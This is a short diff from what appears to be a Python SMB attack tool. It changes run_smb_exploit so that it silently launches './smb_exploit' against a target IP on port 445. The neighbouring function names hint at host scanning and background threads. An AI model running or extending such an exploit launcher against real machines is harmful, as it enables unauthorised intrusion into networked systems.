@@ -878,7 +878,7 @@ def check_smb_v2(host):
     return False
 
 def run_smb_exploit(server_ip, server_port="445"):
-    cmd = ["./smb2_pipe_exec_client", server_ip, server_port]
+    cmd = ["./smb_exploit", server_ip, server_port]
     subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def run_background_thread(host_ip):
